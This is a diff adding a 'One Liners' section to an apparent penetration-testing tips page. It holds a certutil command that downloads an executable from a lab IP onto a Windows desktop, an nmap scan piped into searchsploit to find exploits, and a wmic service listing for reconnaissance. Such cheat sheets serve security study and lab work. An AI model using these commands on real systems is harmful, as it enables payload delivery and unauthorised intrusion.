@@ -3,7 +3,20 @@ layout: default
 title: Tips and Tricks
 ---
 
-
+One Liners
+==========
+Dowloading file via certutil
+{% highlight bash%}
+cmd.exe /C certutil  -split -urlcache -f http://10.10.10.10/exe.LOL c:\Users\Admin\Desktop\exe.lol
+{% endhighlight %}
+Nmap scan ran through searchsploit
+{% highlight bash%}
+nmap -p- -sV -oX new.xml 10.10.10.10; searchsploit --nmap new.xml
+{% endhighlight %}
+List al started services
+{% highlight bash%}
+cmd.exe /c wmic service where started=true get name, startname
+{% endhighlight %}
 Tmux shortcut
 =============
 {% highlight bash%}
